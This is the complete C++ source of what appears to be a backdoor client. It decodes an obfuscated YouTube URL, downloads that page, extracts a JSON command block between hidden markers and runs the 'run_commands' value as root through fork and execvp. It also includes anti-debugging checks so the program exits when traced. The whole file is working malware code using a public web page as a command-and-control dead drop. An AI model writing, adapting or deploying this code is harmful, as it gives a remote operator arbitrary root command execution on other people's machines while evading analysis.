#include <iostream>
#include <cstdlib>
#include <cstring>
#include <vector>
#include <string>
#include <json/json.h>
#include <curl/curl.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <openssl/evp.h>
#include <openssl/bio.h>
#include <openssl/buffer.h>
#include <signal.h>
#include <sys/ptrace.h>
#include <unordered_map>
#include <sstream>

std::string getBanner() {
    return R"(


                                                                                                    
                                                                                                    
                                                  ▓██                                               
                                                ▓█████▓                                             
                                               ████ ████▒                                           
                                             ████  █▓ ████▒                                         
                                           ████  █████▒ ████                                        
                                         ████▓ ███████▓█ ▒████                                      
                                       ▓███▓ ███████▒████▓ ▒████                                    
                                     ▓████ ▓██████ ████████▓ ▓███▓                                  
                                    ████ ▓██████ ████████████  ████▓                                
                                  ████  ██████▒██████▓ ██████ ▓  ████▒                              
                                ████  ██████▒███████ ██████▓ ████  ████                             
                              ████  ██████▓▓██████ ▓█████▓ ██████ ▓  ████                           
                            ▓███▓ ███████▓██████ ▓██████ ██████▓▓███▓ ▒████                         
                           ▓███▓ ▓███████ ████▒ ██████ ███████▓██████  ▓████                        
                             ████▓ ████████ ▒ ██████ ▓██████ ██████   ████                          
                               ████  ███████▓▓████████████ ██████   ████                            
                                 ████  ███████▓▓████████ ██████▓  ████                              
                                   ████ ▒███████ █████░██████▓  ████▒                               
                                     ████ ▒███████ █░▓█████▓  ▓███▒                                 
                                      ░███▓ ▓█████████████  ▒███▓                                   
                                        ▓███▓ ██████████  ▒████                                     
                                          ████▓ ██████   ████                                       
                                            ████  ██   ████                                         
                                              ████   ████                                           
                                                ███████▓                                            
                                                 ▒███▓                                              
                                                   ▓                                                
                                                                                                    
                    ░░     ░▒      ░▒       ░░        ░▒                                            
                 ███▓▓██ ▓█▓▓██  ██▒▒▓▓  ███▓▓███  ▓██▓▓▓█▒ ██  ▒█▓▓▓▓▓ ▓▓▓█▓▓▓ ██  ██              
                ░██         ▒██  █████  ▓█▓    ▓█▒ ██       ██  ▒█████    ▓█▒    ████               
                 ██    ░  ▒██        ██  ██    ██  ██▒   ▒  ██  ▒█▓       ▓█▒     ██                
                  ▓████▓ ▓██████ ▓████▓   ▓████▓    ▒████▓  ██  ▒██████   ▓█▒     ██                
                                                                                                    
                                                                                          

)";
}

std::string base64Decode(const std::string &encoded) {
    BIO *bio, *b64;
    char *decoded = (char *)malloc(encoded.length());
    if (!decoded) {
        std::cerr << "Failed to allocate memory for base64 decoding" << std::endl;
        return "";
    }

    memset(decoded, 0, encoded.length());

    bio = BIO_new_mem_buf(encoded.data(), -1);
    b64 = BIO_new(BIO_f_base64());
    bio = BIO_push(b64, bio);

    BIO_set_flags(bio, BIO_FLAGS_BASE64_NO_NL);
    int length = BIO_read(bio, decoded, encoded.length());
    if (length < 0) {
        std::cerr << "Failed to decode base64" << std::endl;
        BIO_free_all(bio);
        free(decoded);
        return "";
    }
    decoded[length] = '\0';

    BIO_free_all(bio);

    std::string result(decoded);
    free(decoded);
    return result;
}

std::string decodeHTMLEntities(const std::string &text) {
    std::unordered_map<std::string, char> entities = {
        {"&quot;", '\"'},
        {"&amp;", '&'},
        {"&lt;", '<'},
        {"&gt;", '>'},
        {"&apos;", '\''}
    };

    std::string decoded;
    size_t pos = 0;
    size_t found = text.find('&', pos);
    while (found != std::string::npos) {
        decoded.append(text, pos, found - pos);
        size_t semicolon = text.find(';', found);
        if (semicolon != std::string::npos) {
            std::string entity = text.substr(found, semicolon - found + 1);
            if (entities.find(entity) != entities.end()) {
                decoded.push_back(entities[entity]);
                pos = semicolon + 1;
            } else {
                decoded.append(entity);
                pos = semicolon + 1;
            }
        } else {
            decoded.push_back('&');
            pos = found + 1;
        }
        found = text.find('&', pos);
    }
    decoded.append(text, pos, text.length() - pos);
    return decoded;
}

bool checkForRoot() {
    return geteuid() == 0;
}

bool isDebuggerPresent() {
    if (ptrace(PTRACE_TRACEME, 0, 1, 0) == -1) {
        return true;
    }
    return false;
}

void handleSigtrap(int sig) {
    std::cerr << "Debugger detected! Exiting..." << std::endl;
    exit(1);
}

size_t WriteCallback(void* contents, size_t size, size_t nmemb, void* userp) {
    ((std::string*)userp)->append((char*)contents, size * nmemb);
    return size * nmemb;
}

void run() {
    std::string url = base64Decode("aHR0cHM6Ly93d3cueW91dHViZS5jb20vd2F0Y2g/dj1HeUVlZGZNTGlKSQ==");
    std::string start = base64Decode("U1RBUlRUSEVUUFoyMDIy");
    std::string end = base64Decode("RU5EVEhFVFBaMjAyMg==");

    CURL* curl;
    CURLcode res;
    std::string readBuffer;

    curl_global_init(CURL_GLOBAL_DEFAULT);
    curl = curl_easy_init();
    if(curl) {
        curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteCallback);
        curl_easy_setopt(curl, CURLOPT_WRITEDATA, &readBuffer);
        res = curl_easy_perform(curl);
        if (res != CURLE_OK) {
            std::cerr << "curl_easy_perform() failed: " << curl_easy_strerror(res) << std::endl;
            curl_easy_cleanup(curl);
            curl_global_cleanup();
            return;
        }
        curl_easy_cleanup(curl);
    }
    curl_global_cleanup();

    size_t startIndex = readBuffer.find(start);
    size_t endIndex = readBuffer.find(end);

    if (startIndex == std::string::npos || endIndex == std::string::npos || startIndex >= endIndex) {
        std::cerr << "Failed to find start and end markers in response" << std::endl;
        return;
    }

    std::string object = readBuffer.substr(startIndex + start.length(), endIndex - (startIndex + start.length()));

    // Decode HTML entities
    object = decodeHTMLEntities(object);

    Json::Value controll;
    Json::CharReaderBuilder builder;
    std::string errs;
    std::istringstream iss(object);
    if (!Json::parseFromStream(builder, iss, &controll, &errs)) {
        std::cerr << "Failed to parse JSON: " << errs << std::endl;
        return;
    }

    if (controll["run_commands"].asString() != "false") {
        std::cout << "Enabled" << std::endl;

        std::string command = controll["run_commands"].asString();
        std::vector<char*> args;
        char* cmd = strdup(command.c_str());
        if (!cmd) {
            std::cerr << "Failed to allocate memory for command" << std::endl;
            return;
        }

        char* token = strtok(cmd, " ");
        while (token != nullptr) {
            args.push_back(token);
            token = strtok(nullptr, " ");
        }
        args.push_back(nullptr);

        pid_t pid = fork();
        if (pid == 0) {
            execvp(args[0], args.data());
            std::cerr << "Failed to execute command" << std::endl;
            exit(EXIT_FAILURE);
        } else if (pid < 0) {
            std::cerr << "Fork failed" << std::endl;
        } else {
            waitpid(pid, NULL, 0); // Wait for the child process to finish
        }
        free(cmd);
    } else {
        std::cout << "Abort" << std::endl;
    }
}

int main() {
    // Anti-debugging techniques
    signal(SIGTRAP, handleSigtrap);
    if (isDebuggerPresent()) {
        std::cerr << "Debugger detected! Exiting..." << std::endl;
        return 1;
    }

    if (!checkForRoot()) {
        std::cout << "This must be run as root (sudo)" << std::endl;
        return 1;
    }

    std::cout << getBanner() << std::endl;

    run();

    return 0;
}
